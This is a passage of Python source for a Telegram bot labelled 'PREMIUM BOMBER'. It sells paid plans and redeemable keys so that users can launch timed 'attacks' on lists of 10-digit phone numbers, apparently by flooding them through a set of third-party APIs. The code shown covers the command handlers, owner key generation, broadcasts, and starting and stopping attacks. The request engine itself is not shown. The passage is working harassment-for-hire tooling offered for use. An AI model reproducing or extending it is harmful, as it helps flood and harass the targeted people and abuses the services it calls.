    await update.message.reply_text(f'{E_LOCK} <b>Send 10-digit number to protect:</b>', parse_mode=ParseMode.HTML)
    context.user_data['waiting_for_protect'] = True


async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    manager.db.unprotect(update.effective_user.id)
    await update.message.reply_text('🔓 <b>Number unprotected.</b>', parse_mode=ParseMode.HTML)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (f'{E_STAR} <b>USER HELP</b>\n\n'
           f'{E_ROCKET} <b>CORE</b>\n'
           f'• /start - Main menu\n• /mix - Multi-target attack\n• /status - Live progress\n\n'
           f'{E_USER} <b>ACCOUNT</b>\n'
           f'• /account - Your plan\n• /plan - All plans\n• /redeem - Activate code\n\n'
           f'{E_LOCK} <b>PROTECTION</b>\n'
           f'• /protect & /unprotect\n\n'
           f'{E_DIAMOND} <b>PLANS:</b>\n'
           f'• Standard - 2 targets / 300min\n'
           f'• Premium - 5 targets / 720min\n'
           f'• Ultimate - 10 targets / 720min\n\n'
           f'{E_CHART} APIs: <b>{len(APIS)}</b>')
    await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id), parse_mode=ParseMode.HTML)


async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
        await generate_key_logic(update, context, text); return
    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
        await broadcast_logic(update, context, text); return
    manager.db.add_user(uid)
    if text in ["🚀 /mix", "/mix"]: await mix_command(update, context)
    elif text in ["📊 /status", "/status"]: await status_command(update, context)
    elif text in ["👤 /account", "/account"]: await account_command(update, context)
    elif text in ["💳 /plan", "/plan"]: await plan_command(update, context)
    elif text in ["🔑 /redeem", "/redeem"]: await redeem_command(update, context)
    elif text in ["🛡 /protect", "/protect"]: await protect_command(update, context)
    elif text in ["🔓 /unprotect", "/unprotect"]: await unprotect_command(update, context)
    elif text in ["❓ /help", "/help"]: await help_command(update, context)
    elif text == "👑 Admin" and uid == OWNER_ID: await show_admin_panel(update, context)
    elif context.user_data.get('waiting_for_numbers') and text.strip():
        await process_numbers(update, context, text)
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        success, days, plan, exp = manager.db.redeem(uid, text.strip().upper())
        if success:
            await update.message.reply_text(f'{E_CHECK} <b>Premium Activated!</b>\n\n{E_CROWN} Plan: <b>{plan.upper()}</b>\n📅 Expiry: <b>{exp}</b>', parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f'{E_CROSS} <b>Invalid or already used code.</b>', parse_mode=ParseMode.HTML)
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        manager.db.protect(uid, text)
        await update.message.reply_text(f'{E_LOCK} <b>Protected:</b> <code>{text}</code>', parse_mode=ParseMode.HTML)
    elif text == "/cancel":
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
            context.user_data.pop(k, None)
        manager.db.clear_attack_data(uid)
        await update.message.reply_text(f'{E_CROSS} Cancelled.', reply_markup=main_kb(uid), parse_mode=ParseMode.HTML)


async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Standard Key (30d)", callback_data="adm_gen_standard")],
        [InlineKeyboardButton("🔑 Premium Key (30d)", callback_data="adm_gen_premium")],
        [InlineKeyboardButton("🔑 Ultimate Key (30d)", callback_data="adm_gen_ultimate")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("🔧 Custom Key", callback_data="adm_custom_key")]
    ])
    await update.message.reply_text(f'{E_CROWN} <b>Admin Control Panel:</b>', reply_markup=kb, parse_mode=ParseMode.HTML)


async def generate_key_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    if update.effective_user.id != OWNER_ID: return
    context.user_data['waiting_for_genkey'] = False
    try:
        parts = text.split()
        days = int(parts[0])
        plan = parts[1].lower() if len(parts) > 1 else "standard"
        if plan not in PLANS: plan = "standard"
        code = manager.db.generate_code(days, plan)
        await update.message.reply_text(f'{E_CHECK} <b>KEY GENERATED</b>\n\n{E_KEY} <code>{code}</code>\n📅 {days}d\n{E_DIAMOND} {plan.upper()}', parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text('❌ Format: <code>days plan</code>', parse_mode=ParseMode.HTML)


async def broadcast_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    if update.effective_user.id != OWNER_ID: return
    context.user_data['waiting_for_broadcast'] = False
    users = manager.db.get_all_users()
    success, failed = 0, 0
    msg = await update.message.reply_text(f'{E_BELL} Broadcasting to {len(users)}...', parse_mode=ParseMode.HTML)
    for u in users:
        try:
            await context.bot.send_message(u, f'{E_BELL} <b>ANNOUNCEMENT</b>\n\n{text}', parse_mode=ParseMode.HTML)
            success += 1
        except: failed += 1
        await asyncio.sleep(0.1)
    await msg.edit_text(f'{E_CHECK} DONE\n✅ {success} | ❌ {failed}', parse_mode=ParseMode.HTML)


async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    numbers = [n.strip() for n in text.replace(',', ' ').split() if n.strip().isdigit() and len(n.strip()) == 10]
    tc = context.user_data.get('expected_targets', 0)
    if len(numbers) != tc:
        await update.message.reply_text(f'{E_CROSS} Send exactly <b>{tc}</b> numbers.', parse_mode=ParseMode.HTML)
        return
    context.user_data['waiting_for_numbers'] = False
    manager.db.set_attack_data(uid, numbers)
    await update.message.reply_text(f'{E_TARGET} Targets: <code>{", ".join(numbers)}</code>\n\n{E_TIME} Select duration:', reply_markup=duration_kb(uid), parse_mode=ParseMode.HTML)


async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    if data == "adm_gen_standard" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "standard")
        await query.message.reply_text(f'{E_CHECK} <b>STANDARD KEY</b>\n<code>{code}</code>', parse_mode=ParseMode.HTML)
    elif data == "adm_gen_premium" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "premium")
        await query.message.reply_text(f'{E_CHECK} <b>PREMIUM KEY</b>\n<code>{code}</code>', parse_mode=ParseMode.HTML)
    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "ultimate")
        await query.message.reply_text(f'{E_CHECK} <b>ULTIMATE KEY</b>\n<code>{code}</code>', parse_mode=ParseMode.HTML)
    elif data == "adm_custom_key" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await query.message.reply_text('Send: <code>days plan</code>', parse_mode=ParseMode.HTML)
    elif data.startswith("targets_"):
        count = int(data.split("_")[1])
        context.user_data['waiting_for_numbers'] = True
        context.user_data['expected_targets'] = count
        await query.edit_message_text(f'{E_TARGET} Send <b>{count}</b> phone number(s):', parse_mode=ParseMode.HTML)
    elif data.startswith("dur_"):
        targets = manager.db.get_attack_data(uid)
        if not targets:
            await query.edit_message_text('❌ Session expired. Use /mix.', parse_mode=ParseMode.HTML); return
        duration = int(data.split("_")[1])
        success, msg = await manager.start_attack(uid, targets, duration)
        if success:
            await query.edit_message_text(f'{E_ROCKET} <b>ATTACK STARTED!</b>\n\n{E_TARGET} {", ".join(targets)}\n{msg}', parse_mode=ParseMode.HTML)
        else:
            await query.edit_message_text(f'{E_CROSS} {msg}', parse_mode=ParseMode.HTML)
        manager.db.clear_attack_data(uid)
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
            context.user_data.pop(k, None)
        await query.edit_message_text('❌ Cancelled.', parse_mode=ParseMode.HTML)
    elif data == "stop":
        if await manager.stop_attack(uid):
            await query.edit_message_text(f'{E_STOP} Stopped.', parse_mode=ParseMode.HTML)
        else:
            await query.answer("No active attack.")
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text('📢 Send broadcast message:', parse_mode=ParseMode.HTML)
    elif data == "adm_stats" and uid == OWNER_ID:
        u, p, c = manager.db.get_stats()
        await query.message.reply_text(f'{E_CHART} <b>STATS</b>\n\n{E_USER} {u}\n{E_CROWN} {p}\n{E_KEY} {c}\n{E_ROCKET} APIs: {len(APIS)}', parse_mode=ParseMode.HTML)
    elif data == "info":
        await query.answer(f"⚡ {manager.db.get_concurrent_limit(uid)}x workers", show_alert=True)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
        context.user_data.pop(k, None)
    manager.db.clear_attack_data(uid)
    await update.message.reply_text('❌ Cancelled.', reply_markup=main_kb(uid))


async def run_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mix", mix_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("account", account_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(CallbackQueryHandler(btn_handler))
    print("=" * 55)
    print(f"🔥 PREMIUM BOMBER Started (MongoDB + All APIs)")
    print(f"📊 APIs: {len(APIS)}")
    print(f"🗄️  MongoDB: {DB_NAME}")
    print(f"👑 Owner: {OWNER_ID}")
    print("=" * 55)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    while True:
        await asyncio.sleep(3600)


async def main_async():
    asyncio.create_task(web_server())
    await run_bot()


def main():
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(main_async())
    except (KeyboardInterrupt, SystemExit):
        print("🛑 Stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
        raise


if __name__ == "__main__":
    main()
